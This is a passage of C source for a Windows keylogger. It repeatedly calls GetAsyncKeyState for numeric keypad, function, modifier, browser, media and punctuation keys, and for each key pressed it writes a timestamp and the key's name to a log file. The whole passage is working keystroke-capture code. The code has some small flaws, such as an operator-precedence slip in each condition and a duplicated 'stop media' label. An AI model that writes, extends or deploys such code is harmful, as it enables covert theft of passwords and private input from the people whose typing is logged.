         if(keyvalue=GetAsyncKeyState(0x68)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 8 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x69)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 9 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nmultiply key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nadd key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nseparator key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nsubtract key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6E)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ndecimal key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x6F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ndivide key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x70)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf1 keys(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x71)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf2 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x72)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf3 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x73)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf4 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x74)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf5 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x75)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf6 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x76)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nf7 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x77)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf8 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x78)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf9 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x79)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nf10 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf11 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7B)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf12 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nf13 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nf14 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7E)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf15 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x7F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nf16 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x80)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf17 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x81)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf18 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x82)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf19 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x83)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf20 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x84)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf21 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x85)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf22 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x86)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf23 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x87)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nf24 key(caps off)\n");
        }
        /* Starting From 90 Because Rest Are Reserved */

        if(keyvalue=GetAsyncKeyState(0x90)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nnum lock key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x91)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nscroll lock key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA0)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nleft shift key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA1)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nright shift key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA2)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nleft control key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA3)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nright control key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA4)!=0)
        {
            separator;


           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nleft menu key(caps off)\n");
        }
          if(keyvalue=GetAsyncKeyState(0xA5)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nright menu key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA6)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nbrowser back key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0xA7)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nbrowser forward key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA8)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nbrowser refresh key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA9)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nbrowser stop key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAA)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nbrowser search key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAB)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nbrowser favorites key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAC)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nbrowser start and home key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAD)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nvolume mute key\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAE)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nvolume down key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAF)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;



            fprintf(fp,"\nvolume up key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB0)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nnext track key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB1)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;



            fprintf(fp,"\nprevious track key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB2)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;



            fprintf(fp,"\nstop media key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB3)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nstop media key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB4)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nstart mail key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB5)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nselect media key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB6)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nstart application 1 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB7)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nstart application 2 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBA)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n;(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBB)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\n+(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBC)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\n,(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBD)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\n-(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBE)!=0)
        {
            separator;
            fprintf(fp,"\n.(caps off)\n");
        }
 }


        Sleep(150);
        fclose(fp);
    }
        getch();
}



